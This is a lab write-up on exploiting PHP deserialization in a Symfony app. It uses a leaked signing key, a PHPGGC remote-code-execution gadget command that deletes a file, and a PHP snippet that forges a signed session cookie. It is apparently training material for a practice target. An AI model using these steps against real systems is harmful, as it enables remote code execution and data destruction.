# Lab 06 — PHP Deserialization with a Pre-Built Gadget Chain

## Objective

Identify the framework, generate a PHP gadget-chain object, create a valid signed cookie, and use it to delete:

```text
/home/carlos/morale.txt
```

Credentials:

```text
wiener:peter
```

## Findings from the lab

The source identifies:

```text
PHP 7.4.3-4ubuntu2.29
Symfony 4.3.6
```

## Steps

1. Log in.
2. Send the session-cookie request to Burp Repeater.
3. Inspect the cookie.
4. Notice that it contains a Base64-encoded token and a SHA-1 HMAC signature.
5. Decode the token with Burp Decoder.
6. Confirm that it contains a serialized PHP object.
7. Observe that changing the object invalidates the signature.
8. Identify the debug file:

```text
/cgi-bin/phpinfo.php
```

9. Request it and identify the leaked `SECRET_KEY`.
10. Generate a Symfony RCE gadget using PHPGGC:

```bash
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
```

11. Use the generated object and secret key to construct a signed cookie.

```php
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

12. Replace the session cookie in Repeater.
13. Send the request.

## Learning point

A signature does not protect a system if the signing secret itself is exposed. Integrity verification is useful only when the secret remains protected.
